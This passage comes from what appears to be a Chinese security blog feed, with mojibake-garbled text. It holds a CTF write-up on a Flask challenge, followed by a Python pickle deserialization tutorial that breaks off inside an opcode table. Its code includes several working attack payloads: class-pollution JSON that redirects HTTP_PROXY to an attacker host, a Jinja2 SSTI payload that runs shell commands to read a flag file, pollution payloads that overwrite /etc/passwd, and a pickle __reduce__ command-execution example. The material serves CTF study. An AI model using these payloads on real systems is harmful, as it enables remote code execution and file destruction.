class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;__init__&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;__globals__&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;os&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;environ&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                    <span class="attr">&quot;HTTP_PROXY&quot;</span><span class="punctuation">:</span> <span class="string">&quot;http://192.168.1.11:8899/&quot;</span></span><br><span class="line">                <span class="punctuation">&#125;</span></span><br><span class="line">            <span class="punctuation">&#125;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>å¼€å¯vpsè¿›è¡Œç›‘å¬</p><p>åœ¨æ­¤è°ƒç”¨searchçš„api</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240302144331876.png" alt="image-20240302144331876"></p><p>å¯ä»¥çœ‹è§è¿™é‡Œè¿”å›49, æ­£æ˜¯æˆ‘ä»¬æ¨¡æ¿å­—ç¬¦ä¸²è¢«æ¸²æŸ“åçš„å€¼</p><p>ä¹‹åå°±æ˜¯sstiçš„åˆ©ç”¨</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, jsonify</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, defaults=&#123;<span class="string">&#x27;path&#x27;</span>: <span class="string">&#x27;&#x27;</span>&#125;, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&lt;path:path&gt;&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">proxy</span>(<span class="params">path</span>):</span><br><span class="line"></span><br><span class="line">    payload = <span class="string">&quot;&#123;% for c in &#x27;&#x27;.__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&#x27;catch_warnings&#x27;%&#125;&#123;&#123; c.__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&#x27;__import__(\&quot;os\&quot;).popen(\&quot;cat /app/jW2SzsJM39euQ1sPj5JWpNRGcS1Etzbq_FLAG\&quot;).read()&#x27;)&#125;&#125;&#123;% endif %&#125;&#123;%endfor%&#125;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> payload, <span class="number">200</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;192.168.1.11&#x27;</span>, debug=<span class="literal">True</span>, port=<span class="number">8899</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240302154000485.png" alt="image-20240302154000485"></p><h2 id="æ³•äºŒ-Flaskå˜é‡æ±¡æŸ“"><a href="#æ³•äºŒ-Flaskå˜é‡æ±¡æŸ“" class="headerlink" title="æ³•äºŒ(Flaskå˜é‡æ±¡æŸ“)"></a>æ³•äºŒ(Flaskå˜é‡æ±¡æŸ“)</h2><p>å‚è€ƒ:</p><p><a href="https://tttang.com/archive/1876/">https://tttang.com/archive/1876/</a></p><h3 id="spec-è·å–sys"><a href="#spec-è·å–sys" class="headerlink" title="__spec__è·å–sys"></a><code>__spec__</code>è·å–sys</h3><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;__init__&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;__globals__&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;os&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;__spec__&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;__init__&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                    <span class="attr">&quot;__globals__&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                        <span class="attr">&quot;sys&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                            <span class="attr">&quot;modules&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                                <span class="attr">&quot;jinja2&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                                    <span class="attr">&quot;runtime&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                                        <span class="attr">&quot;exported&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">                                            <span class="string">&quot;*;__import__(&#x27;os&#x27;).system(&#x27;echo 222 &gt; /etc/passwd&#x27;);#&quot;</span></span><br><span class="line">                                        <span class="punctuation">]</span></span><br><span class="line">                                    <span class="punctuation">&#125;</span></span><br><span class="line">                                <span class="punctuation">&#125;</span></span><br><span class="line">                            <span class="punctuation">&#125;</span></span><br><span class="line">                        <span class="punctuation">&#125;</span></span><br><span class="line">                    <span class="punctuation">&#125;</span></span><br><span class="line">                <span class="punctuation">&#125;</span></span><br><span class="line">            <span class="punctuation">&#125;</span></span><br><span class="line">            <span class="punctuation">&#125;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><h3 id="loader-è·å–sys"><a href="#loader-è·å–sys" class="headerlink" title="__loader__è·å–sys"></a><code>__loader__</code>è·å–sys</h3><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;__init__&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;__globals__&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;__loader__&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;__init__&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                    <span class="attr">&quot;__globals__&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                        <span class="attr">&quot;sys&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                            <span class="attr">&quot;modules&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                                <span class="attr">&quot;jinja2&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                                    <span class="attr">&quot;runtime&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                                        <span class="attr">&quot;exported&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">                                            <span class="string">&quot;*;__import__(&#x27;os&#x27;).system(&#x27;echo 111 &gt; /etc/passwd&#x27;);#&quot;</span></span><br><span class="line">                                        <span class="punctuation">]</span></span><br><span class="line">                                    <span class="punctuation">&#125;</span></span><br><span class="line">                                <span class="punctuation">&#125;</span></span><br><span class="line">                            <span class="punctuation">&#125;</span></span><br><span class="line">                        <span class="punctuation">&#125;</span></span><br><span class="line">                    <span class="punctuation">&#125;</span></span><br><span class="line">                <span class="punctuation">&#125;</span></span><br><span class="line">            <span class="punctuation">&#125;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><h2 id="æ³•ä¸‰-æ±¡æŸ“requestsæ¨¡å—çš„respone"><a href="#æ³•ä¸‰-æ±¡æŸ“requestsæ¨¡å—çš„respone" class="headerlink" title="æ³•ä¸‰(æ±¡æŸ“requestsæ¨¡å—çš„respone)"></a>æ³•ä¸‰(æ±¡æŸ“requestsæ¨¡å—çš„respone)</h2><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;__init__&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;__globals__&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;requests&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                    <span class="attr">&quot;Response&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                        <span class="attr">&quot;text&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&#123;% for c in &#x27;&#x27;.__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&#x27;catch_warnings&#x27;%&#125;&#123;&#123; c.__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&#x27;__import__(\&quot;os\&quot;).popen(\&quot;cat /app/jW2SzsJM39euQ1sPj5JWpNRGcS1Etzbq_FLAG\&quot;).read()&#x27;)&#125;&#125;&#123;% endif %&#125;&#123;%endfor%&#125;&quot;</span></span><br><span class="line">                    <span class="punctuation">&#125;</span></span><br><span class="line">                <span class="punctuation">&#125;</span></span><br><span class="line">            <span class="punctuation">&#125;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Swagger-docs&quot;&gt;&lt;a href=&quot;#Swagger-docs&quot; class=&quot;headerlink&quot; title=&quot;Swagger docs&quot;&gt;&lt;/a&gt;Swagger docs&lt;/h1&gt;&lt;p&gt;ä¸€è¿›å»æ˜¯ä¸€ä¸ªæ–‡æ¡£å†…å®¹, è¿˜ä»¥ä¸ºæ˜¯å®¹å™¨æ²¡å¼„å¥½&lt;/p&gt;
&lt;p&gt;ä»”</summary>
      
    
    
    
    
    <category term="Flaskå®¡è®¡" scheme="http://example.com/tags/Flask%E5%AE%A1%E8%AE%A1/"/>
    
    <category term="ssti" scheme="http://example.com/tags/ssti/"/>
    
    <category term="PythonåŸå‹é“¾æ±¡æŸ“(ç±»æ±¡æŸ“)" scheme="http://example.com/tags/Python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93-%E7%B1%BB%E6%B1%A1%E6%9F%93/"/>
    
  </entry>
  
  <entry>
    <title>pickleååºåˆ—åŒ–</title>
    <link href="http://example.com/2024/02/28/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <id>http://example.com/2024/02/28/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</id>
    <published>2024-02-28T08:10:51.000Z</published>
    <updated>2024-02-29T08:16:43.516Z</updated>
    
    <content type="html"><![CDATA[<h1 id="pickleååºåˆ—åŒ–"><a href="#pickleååºåˆ—åŒ–" class="headerlink" title="pickleååºåˆ—åŒ–"></a>pickleååºåˆ—åŒ–</h1><p>åœ¨pyhtonä¸­ä¹Ÿå­˜åœ¨åºåˆ—åŒ–å’Œååºåˆ—åŒ–çš„æ“ä½œ, ç”±pickleæ¨¡å—å®ç°</p><p>ä¸phpä¸­çš„<code>serialize()</code>å’Œ<code>unserialize()</code>ç›¸å¯¹åº”,åœ¨pythonä¸­ä¸º<code>pickle.dump()</code>å’Œ<code>pickle.load()</code></p><p>ç¤ºä¾‹:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line">data = <span class="string">&#x27;hello, world!&#x27;</span></span><br><span class="line">filename = <span class="string">&#x27;nacl&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    pickle.dump(data, f) <span class="comment"># åºåˆ—åŒ–</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="built_in">print</span>(f.read())</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="built_in">print</span>(pickle.load(f)) <span class="comment"># ååºåˆ—åŒ–</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">#è¾“å‡º</span></span><br><span class="line"><span class="comment"># b&#x27;\x80\x04\x95\x11\x00\x00\x00\x00\x00\x00\x00\x8c\rhello, world!\x94.&#x27;</span></span><br><span class="line"><span class="comment"># hello, world!</span></span><br></pre></td></tr></table></figure><blockquote><p>pickle.load()ç”¨äºä»æ–‡ä»¶ä¸­åŠ è½½åºåˆ—åŒ–çš„å¯¹è±¡</p><p>pickle.load()ä»å­—èŠ‚æµä¸­åŠ è½½åºåˆ—åŒ–çš„å¯¹è±¡</p><p>pickle.dump()å°†åºåˆ—åŒ–çš„äºŒè¿›åˆ¶æ•°æ®ä¿å­˜åˆ°æ–‡ä»¶</p><p>pickle.dumps()ç›´æ¥è¿”å›åºåˆ—åŒ–åçš„äºŒè¿›åˆ¶æµ</p></blockquote><h2 id="reduce-æ–¹æ³•"><a href="#reduce-æ–¹æ³•" class="headerlink" title="__reduce__æ–¹æ³•"></a><code>__reduce__</code>æ–¹æ³•</h2><blockquote><p><code>__reduce__</code><br>è°ƒç”¨:è¢«å®šä¹‰ä¹‹åï¼Œå½“å¯¹è±¡è¢«pickleæ—¶å°±ä¼šè§¦å‘<br>ä½œç”¨:å¦‚æœæ¥æ”¶åˆ°çš„æ˜¯å­—ç¬¦ä¸²ï¼Œå°±ä¼šæŠŠè¿™ä¸ªå­—ç¬¦ä¸²å½“æˆä¸€ä¸ªå…¨å±€å˜é‡çš„åç§°ï¼Œç„¶åPythonæŸ¥æ‰¾å®ƒå¹¶è¿›å»pickle<br>    å¦‚æœæ¥æ”¶åˆ°çš„æ˜¯å…ƒç»„ï¼Œè¿™ä¸ªå…ƒç»„åº”è¯¥åŒ…å«2-6ä¸ªå…ƒç´ ï¼Œå…¶ä¸­åŒ…æ‹¬ï¼šä¸€ä¸ªå¯è°ƒç”¨å¯¹è±¡ï¼Œç”¨äºåˆ›å»ºå¯¹è±¡ï¼Œå‚æ•°å…ƒç´ ï¼Œä¾›å¯¹è±¡è°ƒç”¨</p></blockquote><p>ä¾‹:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">a</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> (os.system,(<span class="string">&#x27;whoami&#x27;</span>,))</span><br><span class="line">s = a() </span><br><span class="line">payload = pickle.dumps(s)</span><br><span class="line">pickle.loads(payload)</span><br></pre></td></tr></table></figure><p><strong>æ³¨: pickleååºåˆ—åŒ–åæ‰§è¡Œå‡½æ•°æ—¶ä¼šè‡ªåŠ¨å°è¯•å¯¼å…¥æœªå¯¼å…¥çš„æ¨¡å—, æ‰€ä»¥å³ä¾¿ç½‘ç«™åº”ç”¨å¹¶æ²¡æœ‰import os ä¹Ÿå¯ä»¥æ‰§è¡ŒæˆåŠŸ</strong></p><p>æ­¤æ—¶whoamiä¼šè¢«æ‰§è¡Œ,è¾¾åˆ°ç›®çš„,</p><p>å½“ç„¶ä¹Ÿå¯ä»¥é€šè¿‡os.systemæ¥æ‰§è¡Œå‘½ä»¤åå¼¹shell</p><h2 id="opcode"><a href="#opcode" class="headerlink" title="opcode"></a>opcode</h2><p>opcodeå°±æ˜¯åºåˆ—åŒ–åçš„ç»“æœ, å®é™…ä¸Šå®ƒæ˜¯å°†å¯¹è±¡ç­‰å®ä¾‹åŒ–ä¸ºæŸç§æŒ‡ä»¤é›†çš„ç»“æœ, ä¾é PVMæ¥è§£æ</p><p>v0 ç‰ˆåè®®æ˜¯åŸå§‹çš„â€œäººç±»å¯è¯»â€åè®®ï¼Œå¹¶ä¸”å‘åå…¼å®¹æ—©æœŸç‰ˆæœ¬çš„ Python</p><p>ç”±äºå…¶å‘å‰å…¼å®¹çš„ç‰¹æ€§, æˆ‘ä»¬å¯ä»¥æ‰‹åŠ¨ç¼–å†™opcodeæŒ‡ä»¤, ååºåˆ—åŒ–å³å¯æ‰§è¡Œæ¶æ„è„šæœ¬</p><h2 id="PVM"><a href="#PVM" class="headerlink" title="PVM"></a>PVM</h2><p>PVMç”±ä»¥ä¸‹ä¸‰éƒ¨åˆ†ç»„æˆ</p><ul><li>æŒ‡ä»¤å¤„ç†å™¨ï¼šä»æµä¸­è¯»å– <code>opcode</code> å’Œå‚æ•°ï¼Œå¹¶å¯¹å…¶è¿›è¡Œè§£é‡Šå¤„ç†ã€‚é‡å¤è¿™ä¸ªåŠ¨ä½œï¼Œç›´åˆ°é‡åˆ° . è¿™ä¸ªç»“æŸç¬¦ååœæ­¢ã€‚ æœ€ç»ˆç•™åœ¨æ ˆé¡¶çš„å€¼å°†è¢«ä½œä¸ºååºåˆ—åŒ–å¯¹è±¡è¿”å›ã€‚</li><li>stackï¼šç”± Python çš„ <strong><code>list</code></strong> å®ç°ï¼Œè¢«ç”¨æ¥ä¸´æ—¶å­˜å‚¨æ•°æ®ã€å‚æ•°ä»¥åŠå¯¹è±¡ã€‚</li><li>memoï¼šç”± Python çš„ <strong><code>dict</code></strong> å®ç°ï¼Œä¸º PVM çš„æ•´ä¸ªç”Ÿå‘½å‘¨æœŸæä¾›å­˜å‚¨ã€‚</li></ul><h2 id="å¸¸ç”¨çš„opcode"><a href="#å¸¸ç”¨çš„opcode" class="headerlink" title="å¸¸ç”¨çš„opcode"></a>å¸¸ç”¨çš„opcode</h2><table><thead><tr><th align="left">æŒ‡ä»¤</th><th align="left">æè¿°</th><th align="left">å…·ä½“å†™æ³•</th><th align="left">æ ˆä¸Šçš„å˜åŒ–</th></tr></thead><tbody><tr><td align="left">c</td><td align="left">è·å–ä¸€ä¸ªå…¨å±€å¯¹è±¡æˆ–importä¸€ä¸ªæ¨¡å—</td><td align="left">c[module]\n[instance]\n</td><td align="left">è·å¾—çš„å¯¹è±¡å…¥æ ˆ</td></tr><tr><td align="left">o</td><td align="left">å¯»æ‰¾æ ˆä¸­çš„ä¸Šä¸€ä¸ªMARKï¼Œä»¥ä¹‹é—´çš„ç¬¬ä¸€ä¸ªæ•°æ®ï¼ˆå¿…é¡»ä¸ºå‡½æ•°ï¼‰ä¸ºcallableï¼Œç¬¬äºŒä¸ªåˆ°ç¬¬nä¸ªæ•°æ®ä¸ºå‚æ•°ï¼Œæ‰§è¡Œè¯¥å‡½æ•°ï¼ˆæˆ–å®ä¾‹åŒ–ä¸€ä¸ªå¯¹è±¡ï¼‰</td><td align="left">o</td><td align="left">è¿™ä¸ªè¿‡ç¨‹ä¸­æ¶‰åŠåˆ°çš„æ•°æ®éƒ½å‡ºæ ˆï¼Œå‡½æ•°çš„è¿”å›å€¼ï¼ˆæˆ–ç”Ÿæˆçš„å¯¹è±¡ï¼‰å…¥æ ˆ</td></tr><tr><td align="left">i</td><td align="left">ç›¸å½“äºcå’Œoçš„ç»„åˆï¼Œå…ˆè·å–ä¸€ä¸ªå…¨å±€å‡½æ•°ï¼Œç„¶åå¯»æ‰¾æ ˆä¸­çš„ä¸Šä¸€ä¸ªMARKï¼Œå¹¶ç»„åˆä¹‹é—´çš„æ•°æ®ä¸ºå…ƒç»„ï¼Œä»¥è¯¥å…ƒç»„ä¸ºå‚æ•°æ‰§è¡Œå…¨å±€å‡½æ•°ï¼ˆæˆ–å®ä¾‹åŒ–ä¸€ä¸ªå¯¹è±¡ï¼‰</td><td align="left">i[module]\n[callable]\n</td><td align="left">è¿™ä¸ªè¿‡ç¨‹ä¸­æ¶‰åŠåˆ°çš„æ•°æ®éƒ½å‡ºæ ˆï¼Œå‡½æ•°è¿”å›å€¼ï¼ˆæˆ–ç”Ÿæˆçš„å¯¹è±¡ï¼‰å…¥æ ˆ</td></tr><tr><td align="left">N</td><td align="left">å®ä¾‹åŒ–ä¸€ä¸ªNone</td><td align="left">N</td><td align="left">è·å¾—çš„å¯¹è±¡å…¥æ ˆ</td></tr><tr><td align="left">S</td><td align="left">å®ä¾‹åŒ–ä¸€ä¸ªå­—ç¬¦ä¸²å¯¹è±¡</td><td align="left">Sâ€™xxxâ€™\nï¼ˆä¹Ÿå¯ä»¥ä½¿ç”¨åŒå¼•å·ã€&#39;ç­‰pythonå­—ç¬¦ä¸²å½¢å¼ï¼‰</td><td align="left">è·å¾—çš„å¯¹è±¡å…¥æ ˆ</td></tr><tr><td align="left">V</td><td align="left">å®ä¾‹åŒ–ä¸€ä¸ªUNICODEå­—ç¬¦ä¸²å¯¹è±¡</td><td align="left">Vxxx\n</td><td align="left">è·å¾—çš„å¯¹è±¡å…¥æ ˆ</td></tr><tr><td align="left">I</td><td align="left">å®ä¾‹åŒ–ä¸€ä¸ªintå¯¹è±¡</td><td align="left">Ixxx\n</td><td align="left">è·å¾—çš„å¯¹è±¡å…¥æ ˆ</td></tr><tr><td align="left">F</td><td align="left">å®ä¾‹åŒ–ä¸€ä¸ªfloatå¯¹è±¡</td><td align="left">Fx.x\n</td><td align="left">è·å¾—çš„å¯¹è±¡å…¥æ ˆ</td></tr><tr><td align="left">R</td><td align="left">é€‰æ‹©æ ˆä¸Šçš„ç¬¬ä¸€ä¸ªå¯¹è±¡ä½œä¸ºå‡½æ•°ã€ç¬¬äºŒä¸ªå¯¹è±¡ä½œä¸ºå‚æ•°ï¼ˆç¬¬äºŒä¸ªå¯¹è±¡å¿…é¡»ä¸ºå…ƒç»„ï¼‰ï¼Œç„¶åè°ƒç”¨è¯¥å‡½æ•°</td><td align="left">R</td><td align="left">å‡½æ•°å’Œå‚æ•°å‡ºæ ˆï¼Œå‡½æ•°çš„è¿”å›å€¼å…¥æ ˆ</td></tr><tr><td align="left">.</td><td align="left">ç¨‹åºç»“æŸï¼Œæ ˆé¡¶çš„ä¸€ä¸ªå…ƒç´ ä½œä¸ºpickle.loads()çš„è¿”å›å€¼</td><td align="left">.</td><td align="left">æ— </td></tr><tr><td align="left">(</td><td align="left">å‘æ ˆä¸­å‹å…¥ä¸€ä¸ªMARKæ ‡è®°</td><td align="left">(</td><td align="left">MARKæ ‡è®°å…¥æ ˆ</td></tr><tr><td align="left">t</td><td align="left">å¯»æ‰¾æ ˆä¸­çš„ä¸Šä¸€ä¸ªMARKï¼Œå¹¶ç»„åˆä¹‹é—´çš„æ•°æ®ä¸ºå…ƒç»„</td><td align="left">t</td><td align="left">MARKæ ‡è®°ä»¥åŠè¢«ç»„åˆçš„æ•°æ®å‡ºæ ˆï¼Œè·å¾—çš„å¯¹è±¡å…¥æ ˆ</td></tr><tr><td align="left">)</td><td align="left">å‘æ ˆä¸­ç›´æ¥å‹å…¥ä¸€ä¸ªç©ºå…ƒç»„</td><td align="left">)</td><td align="left">ç©ºå…ƒç»„å…¥æ ˆ</td></tr><tr><td align="left">l</td><td align="left">å¯»æ‰¾æ ˆä¸­çš„ä¸Šä¸€ä¸ªMARKï¼Œå¹¶ç»„åˆä¹‹é—´çš„æ•°æ®ä¸ºåˆ—è¡¨</td><td align="left">l</td><td align="left">MARKæ ‡è®°ä»¥åŠè¢«ç»„åˆçš„æ•°æ®å‡ºæ ˆï¼Œè·å¾—çš„å¯¹è±¡å…¥æ ˆ</td></tr><tr><td align="left">]</td><td align="left">å‘æ ˆä¸­ç›´æ¥å‹å…¥ä¸€ä¸ªç©ºåˆ—è¡¨</td><td align="left">]</td><td align="left">ç©ºåˆ—è¡¨å…¥æ ˆ</td></tr><tr><td align="left">d</td><td align="left">å¯»æ‰¾æ ˆä¸­çš„ä¸Šä¸€ä¸ªMARKï¼Œå¹¶ç»„åˆä¹‹é—´çš„æ•°æ®ä¸ºå­—å…¸ï¼ˆæ•°æ®å¿…é¡»æœ‰å¶æ•°ä¸ªï¼Œå³å‘ˆkey-valueå¯¹ï¼‰</td><td align="left">d</td><td align="left">MARKæ ‡è®°ä»¥åŠè¢«ç»„åˆçš„æ•°æ®å‡ºæ ˆï¼Œè·å¾—çš„å¯¹è±¡å…¥æ ˆ</td></tr><tr><td align="left">}</td><td align="left">å‘æ ˆä¸­ç›´æ¥å‹å…¥ä¸€ä¸ªç©ºå­—å…¸</td><td align="left">}</td><td align="left">ç©ºå­—å…¸å…¥æ ˆ</td></tr><tr><td align="left">p</td><td align="left">å°†æ ˆé¡¶å¯¹è±¡å‚¨å­˜è‡³memo_n</td><td align="left">pn\n</td><td align="left">æ— </td></tr><tr><td align="left">g</td><td align="left">å°†memo_nçš„å¯¹è±¡å‹æ ˆ</td><td align="left">gn\n</td><td align="left">å¯¹è±¡è¢«å‹æ ˆ</td></tr><tr><td align="left">0</td><td align="left">ä¸¢å¼ƒæ ˆé¡¶å¯¹è±¡</td><td align="left">0</td><td align="left">æ ˆé¡¶å¯¹è±¡è¢«ä¸¢å¼ƒ</td></tr><tr><td align="left">b</td><td align="left">ä½¿ç”¨æ ˆä¸­çš„ç¬¬ä¸€ä¸ªå…ƒç´ ï¼ˆå‚¨å­˜å¤šä¸ªå±æ€§å: å±æ€§å€¼çš„å­—å…¸ï¼‰å¯¹ç¬¬äºŒä¸ªå…ƒç´ ï¼ˆå¯¹è±¡å®ä¾‹ï¼‰è¿›è¡Œå±æ€§è®¾ç½®</td><td align="left">b</td><td align="left">æ ˆä¸Šç¬¬ä¸€ä¸ªå…ƒç´ å‡ºæ ˆ</td></tr><tr><td align="left">s</td><td align="left">å°†æ ˆçš„ç¬¬ä¸€ä¸ªå’Œç¬¬äºŒä¸ªå¯¹è±¡ä½œä¸ºkey-valueå¯¹ï¼Œæ·»åŠ æˆ–æ›´æ–°åˆ°æ ˆçš„ç¬¬ä¸‰ä¸ªå¯¹è±¡ï¼ˆå¿…é¡»ä¸ºåˆ—è¡¨æˆ–å­—å…¸ï¼Œåˆ—è¡¨ä»¥æ•°å­—ä½œä¸ºkeyï¼‰ä¸­</td><td align="left">s</td><td align="left">ç¬¬ä¸€ã€äºŒä¸ªå…ƒç´ å‡ºæ ˆï¼Œç¬¬ä¸‰ä¸ªå…ƒç´ 